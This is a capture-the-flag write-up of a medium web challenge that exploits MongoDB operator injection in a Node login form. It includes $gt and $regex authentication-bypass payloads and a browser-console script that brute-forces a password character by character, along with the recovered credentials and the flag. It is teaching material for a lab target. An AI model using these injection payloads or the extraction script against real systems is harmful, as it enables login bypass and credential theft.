# Login App
Web

## Challenge 

http://web4.tamuctf.com

Difficulty: medium

## Solution

Main operating code is in the script within the HTML file.

Upon clicking submit, a POST request is sent with a JSON data string.

    <script>
        $("#submit").on('click', function(){
            $.ajax({
                url: 'login', 
                type : "POST", 
                dataType : 'json', 
                data : JSON.stringify({"username": $("#username").val(), "password": $("#password").val()}),
                contentType: 'application/json;charset=UTF-8',
                success : function(result) {
                    $(".result").html(result);
                    console.log(result);
                    alert(result);
                },
                error: function(xhr, resp, text) {
                    $(".result").html("Something went wrong"); 
                    console.log(xhr, resp, text);
                }
            })
        });
    </script>

To simplify out lifes, add this helper function into the javascript console

    function send(data) {
        $.ajax({
            url: 'login', 
            type : "POST", 
            dataType : 'json', 
            data : data,
            contentType: 'application/json;charset=UTF-8',
            success : function(result) {
                console.log(result);
                // console.log(result, data); // added later
            },
            error: function(xhr, resp, text) {
                console.log(xhr, resp, text);
                // console.log(xhr.responseText); // added later
            }
        });
    }

Send some test request. And we find out it only accepts proper JSON syntax.

    >> send('{"test":1}')
    Login Failed
    
    >> send('{}')
    Login Failed

    >> send('hi')
    POST http://web4.tamuctf.com/login 400 (Bad Request)

Now if we look at the error in the console, we see something in the responseText 

    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <title>Error</title>
    </head>
    <body>
    <pre>SyntaxError: Unexpected token h in JSON at position 0<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at createStrictSyntaxError (/node_modules/body-parser/lib/types/json.js:158:10)<br> &nbsp; &nbsp;at parse (/node_modules/body-parser/lib/types/json.js:83:15)<br> &nbsp; &nbsp;at /node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at emitNone (events.js:106:13)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:208:7)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1064:12)</pre>
    </body>
    </html>

Reformat it to be easier to read... From this, we know that the server takes in our JSON string and parses it using `JSON.parse()` with the node module `body-parser`.

    SyntaxError: Unexpected token h in JSON at position 0
        at JSON.parse (<anonymous>)
        at createStrictSyntaxError (/node_modules/body-parser/lib/types/json.js:158:10)
        at parse (/node_modules/body-parser/lib/types/json.js:83:15)
        at /node_modules/body-parser/lib/read.js:121:18
        at invokeCallback (/node_modules/raw-body/index.js:224:16)
        at done (/node_modules/raw-body/index.js:213:7)
        at IncomingMessage.onEnd (/node_modules/raw-body/index.js:273:7)
        at emitNone (events.js:106:13)
        at IncomingMessage.emit (events.js:208:7)
        at endReadableNT (_stream_readable.js:1064:12)


### MongoDB injection vulnerability

After lots of searching, I found out [an article on a vulnerability](http://scottksmith.com/blog/2015/06/08/secure-node-apps-against-owasp-top-10-injection/)

> When this executes, we will find all users with user greater than "" and pass greater than "". This will return all users within the user table. This happened because we are not explicitly setting the query selector so the attacker was able to specify one themself.

    {
        "user": {"$gt": ""},
        "pass": {"$gt": ""}
    }


Let's try it out

    >> send('{"username": {"$gt": ""}, "password": {"$gt": ""}}')
    Welcome: bob!

    >> send('{"username": "bob", "password": {"$gt": ""}}')
    Welcome: bob!

And we find out that the username is bob. We have no clue on the password though.

Seeing that no login cookies were returned, my initial assumption is the password is probably the flag. (Spoiler: it is not)

### Extract Password?

The [`$gt` is actually one of MongoDB's operators](https://docs.mongodb.com/manual/reference/operator/query/gt/).

Let's try some regex [using `$regex`](https://docs.mongodb.com/manual/reference/operator/query/regex/).

    >> send('{"username": "bob", "password": {"$regex": "^.*"}}')
    Welcome: bob!

Using this idea, we can use regex to check if the string ***starts with a certain character***. 

We repeatedly do this for each character, and compare which one is successful (`Welcome: bob!`).

Afterwhich, we will be able to slowly extract each character of the password

---

I came up with the Javascript code to bruteforce the password.

Run it within the browser JS console.

    successAlready = true; // prevent 2 entries from adding onto flag
    progress = ''
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&\'()*+,-./:;<=>@[\\]^_`{|}~ "

    function escapeRegExp(string){
      return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); 
      // double escape it because it needs to be processed twice
      // $& means the whole matched string
    }

    function execute() {
        successAlready = false; // reset on each attempt
        for (var i = 0; i < charset.length; i++) {
            ch = charset.charAt(i);
            ch = escapeRegExp(ch)
            // payload = {"username": "bob", "password": {"$regex": "^A.*$"}}'.replace('A', progress + ch);
            regex_pattern = "^A.*$".replace('A', progress + ch)
            payload = JSON.stringify({"username": "bob", "password": {"$regex": regex_pattern}})
            // console.log(payload);
            sender(payload, ch);
        }
    }

    function sender(data, ch) {
        return $.ajax({
            url: 'login', 
            type : "POST", 
            dataType : 'json', 
            data : data,
            contentType: 'application/json;charset=UTF-8',
            success : function(result) {
                if (successAlready) return;
                if (result.indexOf("Welcome") !=-1) {
                    console.log("Success", result, progress+ch);
                    progress += ch
                    successAlready = true;
                }
            },
            error: function(xhr, resp, text) {
                // console.log(xhr, resp, text);
                console.log(xhr.responseText); // added later
            }
        });
    }

    // wait until all ajax requests are finished before continuing
    // bruteforce of next character
    $(document).ajaxStop(function () {
        console.log("Continue next:", progress);
        execute();
    });
    execute();

After running for a while, we get a fixed result of `lVeYMg4U4\$@`

    * Success Welcome: bob! l
    * Continue next: l

    * Success Welcome: bob! lV
    * Continue next: lV

    * Success Welcome: bob! lVe
    * Continue next: lVe

    * Success Welcome: bob! lVeY
    * Continue next: lVeY

    * Success Welcome: bob! lVeYM
    * Continue next: lVeYM

    * Success Welcome: bob! lVeYMg
    * Continue next: lVeYMg

    * Success Welcome: bob! lVeYMg4
    * Continue next: lVeYMg4

    * Success Welcome: bob! lVeYMg4U
    * Continue next: lVeYMg4U

    * Success Welcome: bob! lVeYMg4U4
    * Continue next: lVeYMg4U4

    * Success Welcome: bob! lVeYMg4U4\$
    * Continue next: lVeYMg4U4\$

    * Success Welcome: bob! lVeYMg4U4\$@
    * Continue next: lVeYMg4U4\$@

    * Success Welcome: bob! lVeYMg4U4\$@L
    * Continue next: lVeYMg4U4\$@L
    * Continue next: lVeYMg4U4\$@L
    * Continue next: lVeYMg4U4\$@L
    * Continue next: lVeYMg4U4\$@L

So removing the escape character, we get the credentials

    Username: bob
    Password: lVeYMg4U4$@L

---

Strangely enough, bob's login did not yield any flag...

### Regex for Username

Unfortunately, my assumption was wrong. The flag was actually printed out when trying the username instead of the password.

    >> send('{"username": {"$regex": "^a.*"}, "password": {"$gt": ""}}')
    undefined
    Welcome: admin!
    gigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}

Gah! Such a waste of effort. Nevertheless, I learnt a lot about MongoDB from this.

## Flag

	gigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}
